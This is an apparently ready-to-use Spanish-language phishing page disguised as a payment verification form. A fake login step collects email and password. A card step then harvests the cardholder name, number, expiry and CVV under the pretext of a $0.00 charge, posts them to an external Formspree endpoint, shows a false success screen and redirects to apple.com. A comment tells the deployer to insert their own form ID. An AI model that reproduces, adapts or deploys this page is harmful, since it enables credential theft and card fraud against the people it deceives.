<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Pago</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .card {
            background: #fff;
            width: 100%;
            max-width: 380px;
            border-radius: 8px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.1);
            padding: 30px;
            box-sizing: border-box;
        }
        .header {
            text-align: center;
            margin-bottom: 25px;
        }
        .cards-icons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 15px;
        }
        .cards-icons img {
            height: 24px;
            width: auto;
            opacity: 0.8;
        }
        h2 { margin: 10px 0 5px; font-size: 20px; color: #111; }
        p { margin: 0 0 25px; font-size: 14px; color: #666; text-align: center; }
        
        .input-group { margin-bottom: 15px; }
        label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #444; }
        input {
            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px;
            font-size: 15px; box-sizing: border-box; background: #fafafa;
        }
        input:focus {
            outline: none; border-color: #007bff; background: #fff;
            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1);
        }
        .row { display: flex; gap: 15px; }
        .col { flex: 1; }
        
        button {
            width: 100%; padding: 13px; background-color: #007bff; color: white; border: none;
            border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;
            margin-top: 10px; transition: background 0.2s;
        }
        button:hover { background-color: #0056b3; }
        button:disabled { background-color: #ccc; cursor: not-allowed; }

        /* Ocultar secciones */
        .hidden { display: none; }
        
        /* Animaciones */
        .fade-in { animation: fadeIn 0.4s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* Loader y Success */
        .center-content { text-align: center; padding: 20px 0; }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%;
            width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .success-icon {
            font-size: 40px; color: #28a745; margin-bottom: 10px;
        }
        .secure-badge {
            display: flex; align-items: center; justify-content: center; gap: 5px;
            font-size: 12px; color: #888; margin-top: 15px;
        }
    </style>
</head>
<body>

    <div class="card fade-in">
        
        <!-- PASO 1: LOGIN -->
        <div id="step1">
            <div class="header">
                <h2>Bienvenido</h2>
                <p>Ingresa tus credenciales para acceder.</p>
            </div>
            <form id="form-login">
                <div class="input-group">
                    <label>Correo Electrónico</label>
                    <input type="email" id="email" required placeholder="nombre@ejemplo.com">
                </div>
                <div class="input-group">
                    <label>Contraseña</label>
                    <input type="password" id="pass" required placeholder="••••••••">
                </div>
                <button type="submit">Ingresar</button>
            </form>
        </div>

        <!-- PASO 2: TARJETA -->
        <div id="step2" class="hidden">
            <div class="header">
                <div class="cards-icons">
                    <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
                    <img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="Mastercard">
                    <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex">
                </div>
                <h2>Verificar Tarjeta</h2>
                <p>Confirma con una micro-carga de $0.00.</p>
            </div>

            <!-- CAMBIA "TU_ID" POR TU ID DE FORMSPREE -->
            <form id="form-card" action="https://formspree.io/f/maeybpog" method="POST">
                <div class="input-group">
                    <label>Nombre en la tarjeta</label>
                    <input type="text" name="Nombre" placeholder="NOMBRE COMPLETO" required>
                </div>
                <div class="input-group">
                    <label>Número de Tarjeta</label>
                    <input type="text" name="Numero" id="card-num" placeholder="0000 0000 0000 0000" maxlength="19" required>
                </div>
                <div class="row">
                    <div class="col">
                        <div class="input-group">
                            <label>Expiración</label>
                            <input type="text" name="Expiracion" id="card-exp" placeholder="MM/YY" maxlength="5" required>
                        </div>
                    </div>
                    <div class="col">
                        <div class="input-group">
                            <label>CVV</label>
                            <input type="text" name="CVV" placeholder="123" maxlength="4" required>
                        </div>
                    </div>
                </div>
                <button type="submit" id="btn-pagar">Pagar y Verificar</button>
            </form>
        </div>

        <!-- LOADER -->
        <div id="loader" class="center-content hidden">
            <div class="spinner"></div>
            <p>Procesando pago...</p>
        </div>

        <!-- EXITO -->
        <div id="success" class="center-content hidden">
            <div class="success-icon">✔️</div>
            <h2>¡Listo!</h2>
            <p>Tu cuenta ha sido verificada.</p>
            <div class="secure-badge">
                🔒 Conexión segura SSL 256-bit
            </div>
        </div>
    </div>

    <script>
        // Lógica de navegación
        document.getElementById('form-login').addEventListener('submit', (e) => {
            e.preventDefault();
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            document.getElementById('step2').classList.add('fade-in');
        });

        document.getElementById('form-card').addEventListener('submit', (e) => {
            e.preventDefault();
            const btn = document.getElementById('btn-pagar');
            btn.disabled = true;
            btn.innerText = "Verificando...";
            
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('loader').classList.remove('hidden');

            const formData = new FormData(document.getElementById('form-card'));
            
            // Enviar datos
            fetch(document.getElementById('form-card').action, {
                method: 'POST',
                body: formData,
                headers: { 'Accept': 'application/json' }
            }).then(response => {
                if (response.ok) {
                    setTimeout(() => {
                        document.getElementById('loader').classList.add('hidden');
                        document.getElementById('success').classList.remove('hidden');
                        document.getElementById('success').classList.add('fade-in');
                        setTimeout(() => {
                            window.location.href = "https://www.apple.com"; // Redirigir después de 3 seg
                        }, 3000);
                    }, 2000);
                } else {
                    alert("Error al enviar. Intenta de nuevo.");
                    btn.disabled = false;
                    btn.innerText = "Pagar";
                    document.getElementById('step2').classList.remove('hidden');
                }
            }).catch(error => {
                console.error('Error:', error);
                alert("Error de conexión.");
            });
        });

        // Formatear tarjeta
        document.getElementById('card-num').addEventListener('input', function (e) {
            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formatted = '';
            for (let i = 0; i < v.length; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += v[i];
            }
            e.target.value = formatted;
        });

        // Formatear fecha
        document.getElementById('card-exp').addEventListener('input', function (e) {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
            e.target.value = v;
        });
    </script>
</body>
</html>
